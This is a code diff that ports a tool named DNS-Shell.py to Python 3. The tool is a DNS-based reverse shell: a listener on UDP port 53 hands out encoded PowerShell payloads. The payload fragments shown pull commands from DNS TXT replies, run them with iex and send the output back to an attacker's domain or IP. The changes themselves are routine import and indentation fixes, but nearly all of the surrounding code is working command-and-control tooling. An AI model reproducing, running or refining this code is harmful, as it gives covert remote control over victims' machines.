@@ -8,7 +8,7 @@ import re
 import sys
 import binascii
 import threading
-import SocketServer
+import socketserver
 import requests
 from dnslib import *
 
@@ -66,12 +66,11 @@ def prepare_recursive(domain):
     if ($txt -match 'NoCMD'){continue}
     elseif ($txt -match 'exit'){Exit}
     else{execDNS($txt)}
-    }   
-""" % (domain,)
+    }""" % (domain,)
     return powershell_encode(st2)
 
 def prepare_direct(ip):
-   st2 = """
+    st2 = """
     $ip = "%s"
     function execDNS($cmd) {
     $c = iex $cmd 2>&1 | Out-String;
@@ -106,8 +105,7 @@ def prepare_direct(ip):
     if ($txt -match 'NoCMD'){continue}
     elseif ($txt -match 'exit'){Exit}
     else{execDNS($txt)}
-    }   
-""" % (ip,)
+    }""" % (ip,)
     return powershell_encode(st2)
 
 
@@ -164,7 +162,7 @@ def dns_response(data):
         reply = parse_newCMD(request)
     return reply
 
-class BaseRequestHandler(SocketServer.BaseRequestHandler):
+class BaseRequestHandler(socketserver.BaseRequestHandler):
 
     def get_data(self):
         raise NotImplementedError
@@ -182,13 +180,13 @@ class BaseRequestHandler(SocketServer.BaseRequestHandler):
 class UDPRequestHandler(BaseRequestHandler):
 
     def get_data(self):
-    global newConn,recvConn,client_ip
-    if newConn:
-        newConn = 0
-        recvConn = 1
-        client_ip = self.client_address
-        print ("[+] Recieved Connection from %s" % client_ip[0])
-        return self.request[0].strip()
+        global newConn,recvConn,client_ip
+        if newConn:
+            newConn = 0
+            recvConn = 1
+            client_ip = self.client_address
+            print ("[+] Recieved Connection from %s" % client_ip[0])
+            return self.request[0].strip()
 
     def send_data(self, data):
         return self.request[1].sendto(data, self.client_address)
@@ -196,7 +194,7 @@ class UDPRequestHandler(BaseRequestHandler):
 def main(penc, WebRequestFile=None,single=None):
     global cmd,cmds,cr,rcvtime,newCommand,recvConn,client_ip
     UDP_PORT = 53
-    s = SocketServer.ThreadingUDPServer(('',UDP_PORT),UDPRequestHandler)
+    s = socketserver.ThreadingUDPServer(('',UDP_PORT),UDPRequestHandler)
     thread = threading.Thread(target=s.serve_forever)  
     thread.daemon = True  # exit the server thread when the main thread terminates
     try:
@@ -288,7 +286,7 @@ sudo python DNS-Shell.py -l -r [Domain]''')
     elif p.listen and p.recursive:
         print ('[+] Listener recursive queries mode active.')
         listen = p.listen
-                domain = p.recursive
+        domain = p.recursive
         penc = prepare_recursive(domain)
         main(penc)
     else:
